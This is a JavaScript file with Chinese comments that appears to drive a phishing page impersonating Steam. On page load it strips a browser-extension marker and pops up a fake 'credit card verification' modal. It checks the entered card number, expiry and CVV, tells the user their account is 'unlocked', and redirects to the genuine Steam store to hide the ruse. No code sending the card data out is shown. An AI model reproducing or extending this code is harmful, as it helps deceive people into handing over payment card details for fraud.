// 1. 先抓到 Modal 跟表單
const verifyModal = document.getElementById('verify-modal');
const ccForm      = document.getElementById('cc-form');

// 2. 等頁面載入完畢，再清理殘留標記／文字，然後顯示驗證 Modal
window.addEventListener('load', () => {
    console.log('>> page loaded, cleaning up stray elements');

    // 2-1 移除 data-intersub-plugin-allowed 屬性
    const elByAttr = document.querySelector('[data-intersub-plugin-allowed]');
    if (elByAttr) {
        elByAttr.removeAttribute('data-intersub-plugin-allowed');
        console.log('   – removed data-intersub-plugin-allowed attribute');
    }

    // 2-2 如果頁面上有殘留同樣的文字節點，也把它刪了
    document.body.childNodes.forEach(node => {
        if (
            node.nodeType === Node.TEXT_NODE &&
            node.textContent.includes('intersub-plugin-allowed')
        ) {
            node.remove();
            console.log('   – removed stray text node');
        }
    });

    // 2-3 顯示信用卡驗證 Modal（不鎖背景滾動）
    verifyModal.style.display = 'flex';
    console.log('>> verify-modal displayed');
});


// 3. 監聽表單 submit，做驗證
ccForm.addEventListener('submit', e => {
    e.preventDefault(); // 防止真實送出

    console.log('>> form submit detected, validating…');

    // 3-1 取值
    const ccNum    = document.getElementById('cc-number').value.trim();
    const ccExpiry = document.getElementById('cc-expiry').value.trim();
    const ccCvv    = document.getElementById('cc-cvv').value.trim();

    // 3-2 空值檢查
    if (!ccNum || !ccExpiry || !ccCvv) {
        alert('⚠️ 請輸入完整的信用卡號、有 MM/YY 到期日及 CVV！');
        console.log('   – validation failed: empty fields');
        return;
    }

    // 3-3 格式驗證
    const numRe  = /^\d{16}$/;                       // 16 位純數字
    const expRe  = /^(0[1-9]|1[0-2])\/\d{2}$/;       // MM/YY
    const cvvRe  = /^\d{3}$/;                       // 3 位數字

    if (!numRe.test(ccNum)) {
        alert('❌ 信用卡號格式錯誤，請輸入 16 位純數字');
        console.log('   – validation failed: ccNum format');
        return;
    }
    if (!expRe.test(ccExpiry)) {
        alert('❌ 有效期限格式錯誤，請輸入 MM/YY（例如 05/24）');
        console.log('   – validation failed: ccExpiry format');
        return;
    }
    if (!cvvRe.test(ccCvv)) {
        alert('❌ CVV 格式錯誤，請輸入 3 位數字');
        console.log('   – validation failed: ccCvv format');
        return;
    }

    // 4. 全部都通過，顯示成功訊息
    alert('✅ 驗證成功，您的帳號已經解鎖！');
    // console.log('>> validation passed, hiding modal and scheduling redirect');

    // 5. 隱藏 Modal（背景仍可滾動）
    // verifyModal.style.display = 'none';

    // 6. 延遲跳轉到真正的 Steam 官網
    setTimeout(() => {
        console.log('>> Performing redirect now');
        window.location.replace('https://store.steampowered.com/');
    }, 200);
});













